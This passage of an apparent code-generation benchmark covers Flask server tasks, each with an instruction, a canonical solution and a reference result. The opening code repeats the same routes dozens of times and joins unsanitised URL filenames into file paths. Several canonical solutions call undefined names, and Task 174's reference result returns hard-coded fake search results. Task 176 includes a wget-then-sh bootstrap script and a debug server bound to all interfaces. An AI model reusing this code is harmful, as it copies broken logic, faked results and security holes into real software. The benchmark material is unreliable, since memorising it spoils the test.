filename.endswith('.json'):\n            return jsonify({\"msg\": \"Only JSON files are allowed\"}), 400\n        file.save(os.path.join(app.config['REPORTS_DIR'], filename))\n        report = ScanReport(scan_id=scan.id, report_data=open(os.path.join(app.config['REPORTS_DIR'], filename), 'r').read())\n        reports.append(ScanReportSchema().dump(report))\n        db.session.add(report)\n    db.session.commit()\n    return jsonify(reports), 201\n\n@app.route('/scans/<int:scan_id>/logs/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_log(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    log = ScanLog.query.filter_by(scan_id=scan.id, log_entry=filename).first()\n    if not log:\n        return jsonify({\"msg\": \"Log not found\"}), 404\n    db.session.delete(log)\n    db.session.commit()\n    return jsonify({\"msg\": \"Log deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/report/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_report(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    report = ScanReport.query.filter_by(scan_id=scan.id, report_data=filename).first()\n    if not report:\n        return jsonify({\"msg\": \"Report not found\"}), 404\n    os.remove(os.path.join(app.config['REPORTS_DIR'], filename))\n    db.session.delete(report)\n    db.session.commit()\n    return jsonify({\"msg\": \"Report deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['DELETE'])\n@jwt_required()\ndef delete_all_scan_logs(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    logs = ScanLog.query.filter_by(scan_id=scan.id).all()\n    for log in logs:\n        db.session.delete(log)\n    db.session.commit()\n    return jsonify({\"msg\": \"All logs deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['DELETE'])\n@jwt_required()\ndef delete_all_scan_reports(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    reports = ScanReport.query.filter_by(scan_id=scan.id).all()\n    for report in reports:\n        os.remove(os.path.join(app.config['REPORTS_DIR'], report.report_data))\n        db.session.delete(report)\n    db.session.commit()\n    return jsonify({\"msg\": \"All reports deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['PATCH'])\n@jwt_required()\ndef update_scan_log(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    log_id = data.get('log_id')\n    if not log_id:\n        return jsonify({\"msg\": \"Log ID is required\"}), 400\n    log = ScanLog.query.get_or_404(log_id)\n    if log.scan_id != scan.id:\n        return jsonify({\"msg\": \"Log belongs to a different scan\"}), 400\n    log.log_entry = data.get('log_entry', log.log_entry)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['PATCH'])\n@jwt_required()\ndef update_scan_report(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    report_id = data.get('report_id')\n    if not report_id:\n        return jsonify({\"msg\": \"Report ID is required\"}), 400\n    report = ScanReport.query.get_or_404(report_id)\n    if report.scan_id != scan.id:\n        return jsonify({\"msg\": \"Report belongs to a different scan\"}), 400\n    report.report_data = data.get('report_data', report.report_data)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['PUT'])\n@jwt_required()\ndef replace_scan_log(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    log_id = data.get('log_id')\n    if not log_id:\n        return jsonify({\"msg\": \"Log ID is required\"}), 400\n    log = ScanLog.query.get_or_404(log_id)\n    if log.scan_id != scan.id:\n        return jsonify({\"msg\": \"Log belongs to a different scan\"}), 400\n    log.log_entry = data.get('log_entry', log.log_entry)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['PUT'])\n@jwt_required()\ndef replace_scan_report(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    report_id = data.get('report_id')\n    if not report_id:\n        return jsonify({\"msg\": \"Report ID is required\"}), 400\n    report = ScanReport.query.get_or_404(report_id)\n    if report.scan_id != scan.id:\n        return jsonify({\"msg\": \"Report belongs to a different scan\"}), 400\n    report.report_data = data.get('report_data', report.report_data)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['GET'])\n@jwt_required()\ndef get_scan_logs_with_pagination(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    page = request.args.get('page', 1, type=int)\n    per_page = request.args.get('per_page', 10, type=int)\n    logs = ScanLog.query.filter_by(scan_id=scan.id).paginate(page=page, per_page=per_page)\n    return jsonify({\n        'items': [ScanLogSchema().dump(log) for log in logs.items],\n        'total': logs.total,\n        'pages': logs.pages,\n        'current_page': logs.page\n    }), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['GET'])\n@jwt_required()\ndef get_scan_reports_with_pagination(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    page = request.args.get('page', 1, type=int)\n    per_page = request.args.get('per_page', 10, type=int)\n    reports = ScanReport.query.filter_by(scan_id=scan.id).paginate(page=page, per_page=per_page)\n    return jsonify({\n        'items': [ScanReportSchema().dump(report) for report in reports.items],\n        'total': reports.total,\n        'pages': reports.pages,\n        'current_page': reports.page\n    }), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['POST'])\n@jwt_required()\ndef add_scan_log_with_file(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    file = request.files.get('file')\n    if not file:\n        return jsonify({\"msg\": \"File is required\"}), 400\n    filename = secure_filename(file.filename)\n    if not filename:\n        return jsonify({\"msg\": \"Invalid filename\"}), 400\n    if not filename.endswith('.txt'):\n        return jsonify({\"msg\": \"Only text files are allowed\"}), 400\n    file.save(os.path.join(app.config['LOGS_DIR'], filename))\n    log = ScanLog(scan_id=scan.id, log_entry=filename)\n    db.session.add(log)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 201\n\n@app.route('/scans/<int:scan_id>/report', methods=['POST'])\n@jwt_required()\ndef upload_scan_report_with_file(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    file = request.files.get('file')\n    if not file:\n        return jsonify({\"msg\": \"File is required\"}), 400\n    filename = secure_filename(file.filename)\n    if not filename:\n        return jsonify({\"msg\": \"Invalid filename\"}), 400\n    if not filename.endswith('.json'):\n        return jsonify({\"msg\": \"Only JSON files are allowed\"}), 400\n    file.save(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport(scan_id=scan.id, report_data=open(os.path.join(app.config['REPORTS_DIR'], filename), 'r').read())\n    db.session.add(report)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 201\n\n@app.route('/scans/<int:scan_id>/logs/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_log_with_file(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    if not os.path.exists(os.path.join(app.config['LOGS_DIR'], filename)):\n        return jsonify({\"msg\": \"Log file not found\"}), 404\n    os.remove(os.path.join(app.config['LOGS_DIR'], filename))\n    log = ScanLog.query.filter_by(scan_id=scan.id, log_entry=filename).first()\n    if log:\n        db.session.delete(log)\n    db.session.commit()\n    return jsonify({\"msg\": \"Log file deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/report/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_report_with_file(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    if not os.path.exists(os.path.join(app.config['REPORTS_DIR'], filename)):\n        return jsonify({\"msg\": \"Report file not found\"}), 404\n    os.remove(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport.query.filter_by(scan_id=scan.id, report_data=filename).first()\n    if report:\n        db.session.delete(report)\n    db.session.commit()\n    return jsonify({\"msg\": \"Report file deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['GET'])\n@jwt_required()\ndef get_scan_logs_with_filters(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    filters = request.args\n    query = ScanLog.query.filter_by(scan_id=scan.id)\n    if 'timestamp' in filters:\n        timestamp = filters['timestamp']\n        if timestamp.endswith('after'):\n            query = query.filter(ScanLog.timestamp > datetime.strptime(timestamp[:-5], '%Y-%m-%d %H:%M:%S'))\n        elif timestamp.endswith('before'):\n            query = query.filter(ScanLog.timestamp < datetime.strptime(timestamp[:-5], '%Y-%m-%d %H:%M:%S'))\n    if 'log_entry' in filters:\n        query = query.filter(ScanLog.log_entry.contains(filters['log_entry']))\n    logs = query.all()\n    return jsonify([ScanLogSchema().dump(log) for log in logs]), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['GET'])\n@jwt_required()\ndef get_scan_reports_with_filters(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    filters = request.args\n    query = ScanReport.query.filter_by(scan_id=scan.id)\n    if 'timestamp' in filters:\n        timestamp = filters['timestamp']\n        if timestamp.endswith('after'):\n            query = query.filter(ScanReport.generated_at > datetime.strptime(timestamp[:-5], '%Y-%m-%d %H:%M:%S'))\n        elif timestamp.endswith('before'):\n            query = query.filter(ScanReport.generated_at < datetime.strptime(timestamp[:-5], '%Y-%m-%d %H:%M:%S'))\n    if 'report_data' in filters:\n        query = query.filter(ScanReport.report_data.contains(filters['report_data']))\n    reports = query.all()\n    return jsonify([ScanReportSchema().dump(report) for report in reports]), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['POST'])\n@jwt_required()\ndef add_scan_log_with_filters(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    data = request.json\n    filters = data.get('filters', {})\n    log_entry = data.get('log_entry')\n    if not log_entry:\n        return jsonify({\"msg\": \"Log entry is required\"}), 400\n    log = ScanLog(scan_id=scan.id, log_entry=log_entry)\n    db.session.add(log)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 201\n\n@app.route('/scans/<int:scan_id>/report', methods=['POST'])\n@jwt_required()\ndef upload_scan_report_with_filters(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    filters = data.get('filters', {})\n    file = request.files.get('file')\n    if not file:\n        return jsonify({\"msg\": \"File is required\"}), 400\n    filename = secure_filename(file.filename)\n    if not filename:\n        return jsonify({\"msg\": \"Invalid filename\"}), 400\n    if not filename.endswith('.json'):\n        return jsonify({\"msg\": \"Only JSON files are allowed\"}), 400\n    file.save(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport(scan_id=scan.id, report_data=open(os.path.join(app.config['REPORTS_DIR'], filename), 'r').read())\n    db.session.add(report)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 201\n\n@app.route('/scans/<int:scan_id>/logs/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_log_with_filters(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    if not os.path.exists(os.path.join(app.config['LOGS_DIR'], filename)):\n        return jsonify({\"msg\": \"Log file not found\"}), 404\n    os.remove(os.path.join(app.config['LOGS_DIR'], filename))\n    log = ScanLog.query.filter_by(scan_id=scan.id, log_entry=filename).first()\n    if log:\n        db.session.delete(log)\n    db.session.commit()\n    return jsonify({\"msg\": \"Log file deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/report/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_report_with_filters(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    if not os.path.exists(os.path.join(app.config['REPORTS_DIR'], filename)):\n        return jsonify({\"msg\": \"Report file not found\"}), 404\n    os.remove(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport.query.filter_by(scan_id=scan.id, report_data=filename).first()\n    if report:\n        db.session.delete(report)\n    db.session.commit()\n    return jsonify({\"msg\": \"Report file deleted\"}), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['GET'])\n@jwt_required()\ndef get_scan_logs_with_search(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    search = request.args.get('search', '')\n    logs = ScanLog.query.filter_by(scan_id=scan.id).filter(ScanLog.log_entry.contains(search)).all()\n    return jsonify([ScanLogSchema().dump(log) for log in logs]), 200\n\n@app.route('/scans/<int:scan_id>/report', methods=['GET'])\n@jwt_required()\ndef get_scan_reports_with_search(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    search = request.args.get('search', '')\n    reports = ScanReport.query.filter_by(scan_id=scan.id).filter(ScanReport.report_data.contains(search)).all()\n    return jsonify([ScanReportSchema().dump(report) for report in reports]), 200\n\n@app.route('/scans/<int:scan_id>/logs', methods=['POST'])\n@jwt_required()\ndef add_scan_log_with_search(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'running':\n        return jsonify({\"msg\": \"Scan is not running\"}), 400\n    data = request.json\n    search = data.get('search', '')\n    log_entry = data.get('log_entry')\n    if not log_entry:\n        return jsonify({\"msg\": \"Log entry is required\"}), 400\n    log = ScanLog(scan_id=scan.id, log_entry=log_entry)\n    db.session.add(log)\n    db.session.commit()\n    return jsonify(ScanLogSchema().dump(log)), 201\n\n@app.route('/scans/<int:scan_id>/report', methods=['POST'])\n@jwt_required()\ndef upload_scan_report_with_search(scan_id):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    data = request.json\n    search = data.get('search', '')\n    file = request.files.get('file')\n    if not file:\n        return jsonify({\"msg\": \"File is required\"}), 400\n    filename = secure_filename(file.filename)\n    if not filename:\n        return jsonify({\"msg\": \"Invalid filename\"}), 400\n    if not filename.endswith('.json'):\n        return jsonify({\"msg\": \"Only JSON files are allowed\"}), 400\n    file.save(os.path.join(app.config['REPORTS_DIR'], filename))\n    report = ScanReport(scan_id=scan.id, report_data=open(os.path.join(app.config['REPORTS_DIR'], filename), 'r').read())\n    db.session.add(report)\n    db.session.commit()\n    return jsonify(ScanReportSchema().dump(report)), 201\n\n@app.route('/scans/<int:scan_id>/logs/<string:filename>', methods=['DELETE'])\n@jwt_required()\ndef delete_scan_log_with_search(scan_id, filename):\n    scan = Scan.query.get_or_404(scan_id)\n    if scan.status != 'completed':\n        return jsonify({\"msg\": \"Scan is not completed\"}), 400\n    if not os.path.exists(os.path.join(app.config['LOGS_DIR'], filename)):\n        return jsonify({\"msg\": \"Log file not found\"}"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles GET requests for semantic similarity search, processes the query parameters, performs the search operation, and returns JSON-formatted results with timing information.\n\nFunction Description: The function `run_simcse_demo` initializes and runs a Flask web server that provides an API endpoint for semantic similarity search. It configures CORS, sets up request handling, and launches the server using Tornado for production-ready serving. The API endpoint processes query parameters, performs a search operation using an embedder, and returns results with execution time.\n\nInput:\n- port: [int] - The port number on which the server will listen\n- args: [argparse.Namespace] - Command line arguments containing:\n  - ip: [str] - IP address to bind the server\n  - port: [str] - Port number (as string) to bind the server\n\nOutput: None (The function runs indefinitely as a web server)",
    "Canonical_solution": "import json\nimport argparse\nimport os\nimport logging\nfrom flask import Flask, request, jsonify\nfrom flask_cors import CORS\nfrom tornado.wsgi import WSGIContainer\nfrom tornado.httpserver import HTTPServer\nfrom tornado.ioloop import IOLoop\n\nlogging.basicConfig(format='%(asctime)s - %(levelname)s - %(name)s -   %(message)s', datefmt='%m/%d/%Y %H:%M:%S',\n                    level=logging.INFO)\nlogger = logging.getLogger(__name__)\n\ndef run_simcse_demo(port, args):\n    app = Flask(__name__, static_folder='./static')\n    app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False\n    CORS(app)\n\n    @app.route('/api', methods=['GET'])\n    def api():\n        query = request.args['query']\n        top_k = int(request.args['topk'])\n        threshold = float(request.args['threshold'])\n        start = time()\n        results = embedder.search(query, top_k=top_k, threshold=threshold)\n        ret = []\n        out = {}\n        for sentence, score in results:\n            ret.append({\"sentence\": sentence, \"score\": score})\n        span = time() - start\n        out['ret'] = ret\n        out['time'] = \"{:.4f}\".format(span)\n        return jsonify(out)\n\n    addr = args.ip + \":\" + args.port\n    logger.info(f'Starting Index server at {addr}')\n    http_server = HTTPServer(WSGIContainer(app))\n    http_server.listen(port)\n    IOLoop.instance().start()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport time\nimport corsheaders\nimport tornado.ioloop\nimport tornado.web\n\napp = Flask(__name__)\ncorsheaders.CORS(app)\n\ndef run_simcse_demo(port, args):\n    @app.route('/search', methods=['GET'])\n    def search():\n        start_time = time.time()\n        query = request.args.get('query')\n        # Perform semantic similarity search using an embedder\n        # This is a placeholder for the actual search logic\n        results = {\"similarity\": 0.85, \"matches\": [\"match1\", \"match2\"], \"time_taken\": time.time() - start_time}\n        return jsonify(results)\n    \n    # Run the Flask app with Tornado for production readiness\n    app.run(host=args.ip, port=int(port), debug=False)"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Flask-based API class that serves as an interface for a machine learning model, providing endpoints to calculate potential, gradient, and perform minimization operations.\n\nClass Description: FlaskAPI is a class that wraps a machine learning model and exposes its functionality through a RESTful API using Flask. It handles HTTP POST requests to perform model operations and returns JSON responses.\n\nAttributes:\n- webapp: Flask - The Flask application instance that handles HTTP requests\n- model: Any - The machine learning model that provides the core functionality (prediction, gradient calculation, and minimization)\n\nMethods:\n- __init__(model) -> None - Initializes the FlaskAPI with the provided model and sets up routes\n- _setup_routes() -> None - Private method that configures the URL routes and their corresponding handlers\n- run(**kwargs) -> None - Starts the Flask web server with the provided configuration options\n- potential() -> (Response, int) - Handles POST requests to '/potential', calculates model prediction for input data, returns JSON response with result\n- gradient() -> (Response, int) - Handles POST requests to '/gradient', calculates model gradient for input data, returns JSON response with gradient values\n- minimize() -> (Response, int) - Handles POST requests to '/minimize', performs structure minimization using the model, returns JSON response with optimized structure and energy",
    "Canonical_solution": "from flask import request, Flask, jsonify\nimport numpy as np\n\nclass FlaskAPI:\n    def __init__(self, model):\n        self.webapp = Flask(__name__)\n        self.model = model\n        self._setup_routes()\n\n    def _setup_routes(self):\n        self.webapp.add_url_rule('/potential', 'potential', self.potential, methods=[\"POST\"])\n        self.webapp.add_url_rule('/gradient', 'gradient', self.gradient, methods=[\"POST\"])\n        self.webapp.add_url_rule('/minimize', 'minimize', self.minimize, methods=[\"POST\"])\n\n    def run(self, **kwargs):\n        self.webapp.run(**kwargs)\n\n    def potential(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        result = self.model.pred_one(x0, a0)\n        return jsonify({'y': result.tolist()[0]}), 200\n\n    def gradient(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        num_atoms = X.shape[0]\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        res = self.model.grad_one(x0, a0)\n        res = res.reshape((num_atoms, 3))\n        return jsonify({'grad': res.tolist()}), 200\n\n    def minimize(self):\n        content = request.get_json(force=True)\n        if not content or not 'X' in content:\n            abort(400)\n        X = np.array(content['X'])\n        constraints = None\n        if 'constraints' in content:\n            constraints = content['constraints']\n        num_atoms = X.shape[0]\n        x0 = X[:, 1:]\n        a0 = X[:, :1]\n        res = self.model.minimize_structure(x0, a0, constraints)\n        res = res.reshape((num_atoms, 3))\n        y = self.model.pred_one(res, a0).tolist()[0]\n        return jsonify({'X': res.tolist(), 'y': y}), 200",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport json\n\nclass FlaskAPI:\n    def __init__(self, model):\n        self.webapp = Flask(__name__)\n        self.model = model\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.webapp.route('/potential', methods=['POST'])\n        def potential():\n            data = request.get_json()\n            result = self.model.potential(data)\n            return jsonify(result), 200\n\n        @self.webapp.route('/gradient', methods=['POST'])\n        def gradient():\n            data = request.get_json()\n            result = self.model.gradient(data)\n            return jsonify(result), 200\n\n        @self.webapp.route('/minimize', methods=['POST'])\n        def minimize():\n            data = request.get_json()\n            result = self.model.minimize(data)\n            return jsonify(result), 200\n\n    def run(self, **kwargs):\n        self.webapp.run(**kwargs)"
  },
  {
    "Task_id": 176,
    "Instruction": "Task Description: Create a Flask-based HTTP server for managing blueprints, including operations for retrieving, storing, and validating blueprint data and associated tarballs. The server should handle various HTTP methods (GET, PUT) and include metrics tracking for bandwidth and request counts.\n\nClass Description: BlueprintServer is a Flask application wrapper that provides endpoints for blueprint management, including CRUD operations for blueprints and their associated tarballs. It includes validation, metrics tracking, and response handling.\n\nAttributes:\n- app: Flask - The Flask application instance\n- browser_pattern: re.Pattern - Regular expression pattern for detecting browser user agents\n\nMethods:\n- __init__() -> None - Initializes the Flask app and sets up routes\n- _setup_routes() -> None - Defines all URL routes and their associated handlers\n- _blueprint(secret: str, name: str) -> Union[Blueprint, None, bool] - Retrieves and validates a blueprint from the backend\n- _server() -> str - Returns the server's base URL\n- _validate_secret(secret: str) -> None - Validates the secret format (400 if invalid)\n- _validate_name(name: str) -> None - Validates the name format (400 if invalid)\n- _validate_sha(sha: str) -> None - Validates the SHA format (400 if invalid)\n- secret() -> MeteredResponse - Generates and returns a new secret (201 response)\n- get_blueprint(secret: str, name: str) -> Union[MeteredResponse, abort] - Retrieves a blueprint (200/301/404 response)\n- put_blueprint(secret: str, name: str) -> MeteredResponse - Stores a new blueprint (202/400/502 response)\n- get_tarball(secret: str, name: str, sha: str) -> Union[redirect, abort] - Retrieves a tarball (301/404 response)\n- put_tarball(secret: str, name: str, sha: str) -> MeteredResponse - Stores a new tarball (202/400/502 response)\n- sh(secret: str, name: str, name2: str) -> Union[MeteredResponse, abort] - Generates shell script (200/400/404/502 response)\n- user_data(secret: str, name: str) -> MeteredResponse - Generates user-data script (200/404/502 response)\n- run() -> None - Starts the Flask development server",
    "Canonical_solution": "from flask import Flask, Response, request\nimport re\nimport os\nimport base64\nimport json\nimport librato\nimport statsd\nfrom blueprint import Blueprint\nimport backend\n\nclass MeteredResponse(Response):\n    def __init__(self, *args, **kwargs):\n        super(MeteredResponse, self).__init__(*args, **kwargs)\n        content_length = len(kwargs.get('response', ''))\n        if 0 < content_length:\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\nclass BlueprintServer:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self._setup_routes()\n        self.browser_pattern = re.compile(r'Chrome|Gecko|Microsoft|Mozilla|Safari|WebKit')\n\n    def _setup_routes(self):\n        self.app.route('/secret', methods=['GET'])(self.secret)\n        self.app.route('/<secret>/<name>', methods=['GET'])(self.get_blueprint)\n        self.app.route('/<secret>/<name>', methods=['PUT'])(self.put_blueprint)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['GET'])(self.get_tarball)\n        self.app.route('/<secret>/<name>/<sha>.tar', methods=['PUT'])(self.put_tarball)\n        self.app.route('/<secret>/<name>/<name2>.sh', methods=['GET'])(self.sh)\n        self.app.route('/<secret>/<name>/user-data.sh', methods=['GET'])(self.user_data)\n\n    def _blueprint(self, secret, name):\n        data = backend.get_blueprint(secret, name)\n        if data is None:\n            return None\n        elif data is False:\n            return False\n        b = Blueprint()\n        b.name = name\n        b.update(json.loads(data))\n        return b\n\n    def _server(self):\n        return request.url_root\n\n    def _validate_secret(self, secret):\n        if re.match(r'^[0-9A-Za-z_-]{64}$', secret) is None:\n            abort(400)\n\n    def _validate_name(self, name):\n        if re.search(r'[/ \\t\\r\\n]', name) is not None:\n            abort(400)\n\n    def _validate_sha(self, sha):\n        if re.match(r'^[0-9a-f]{40}$', sha) is None:\n            abort(400)\n\n    def secret(self):\n        while True:\n            s = base64.urlsafe_b64encode(os.urandom(48))\n            try:\n                iter(backend.list(s)).next()\n            except StopIteration:\n                break\n        return MeteredResponse(response='{0}\\n'.format(s),\n                             status=201,\n                             content_type='text/plain')\n\n    def get_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        content_length = backend.head_blueprint(secret, name)\n        if content_length is None:\n            abort(404)\n\n        if self.browser_pattern.search(request.environ.get('HTTP_USER_AGENT', '')) or 'html' == request.args.get('format'):\n            librato.count('blueprint-io-server.renders')\n            statsd.increment('blueprint-io-server.renders')\n            return render_template('blueprint.html', b=self._blueprint(secret, name))\n        else:\n            librato.count('blueprint-io-server.requests.get')\n            statsd.increment('blueprint-io-server.requests.get')\n            librato.count('blueprint-io-server.bandwidth.out', content_length)\n            statsd.update('blueprint-io-server.bandwidth.out', content_length)\n            return redirect(backend.url_for_blueprint(secret, name), code=301)\n\n    def put_blueprint(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        try:\n            for k in request.json.iterkeys():\n                if k not in ('arch', 'files', 'packages', 'services', 'sources'):\n                    abort(400)\n        except ValueError:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is not None and b is not False:\n            for filename in set(b.sources.itervalues()) - set(request.json.get('sources', {}).itervalues()):\n                backend.delete_tarball(secret, name, filename[0:-4])\n\n        if not backend.put_blueprint(secret, name, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def get_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        content_length = backend.head_tarball(secret, name, sha)\n        if content_length is None:\n            abort(404)\n\n        librato.count('blueprint-io-server.requests.get')\n        statsd.increment('blueprint-io-server.requests.get')\n        librato.count('blueprint-io-server.bandwidth.out', content_length)\n        statsd.update('blueprint-io-server.bandwidth.out', content_length)\n\n        return redirect(backend.url_for_tarball(secret, name, sha), code=301)\n\n    def put_tarball(self, secret, name, sha):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        sha = sha.lower()\n        self._validate_sha(sha)\n\n        librato.count('blueprint-io-server.bandwidth.in', request.content_length)\n        statsd.update('blueprint-io-server.bandwidth.in', request.content_length)\n\n        if hashlib.sha1(request.data).hexdigest() != sha:\n            abort(400)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        if '{0}.tar'.format(sha) not in b.sources.itervalues():\n            abort(400)\n\n        if not backend.put_tarball(secret, name, sha, request.data):\n            abort(502)\n\n        return MeteredResponse(response='',\n                             status=202,\n                             content_type='text/plain')\n\n    def sh(self, secret, name, name2):\n        if 'user-data' == name2:\n            return self.user_data(secret, name)\n        if name != name2:\n            abort(400)\n        self._validate_secret(secret)\n        self._validate_name(name)\n\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        s = b.sh(server=self._server(), secret=secret)\n        s.out.insert(0, '#!/bin/sh\\n\\n')\n        return MeteredResponse(response=s.dumps(),\n                             status=200,\n                             content_type='text/plain')\n\n    def user_data(self, secret, name):\n        self._validate_secret(secret)\n        self._validate_name(name)\n        b = self._blueprint(secret, name)\n        if b is None:\n            abort(404)\n        elif b is False:\n            abort(502)\n        return MeteredResponse(response=f\"\"\"#!/bin/sh\n\nset -e\n\nTMPDIR=\"$(mktemp -d)\"\ncd \"$TMPDIR\"\ntrap \"rm -rf \\\\\"$TMPDIR\\\\\"\" EXIT\n\nwget \"{self._server()}/{secret}/{name}/{name}.sh\"\n\nsh \"$(ls)\"\n\"\"\",\n                           status=200,\n                           content_type='text/plain')\n\n    def run(self):\n        self.app.run(host='0.0.0.0', debug=True)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
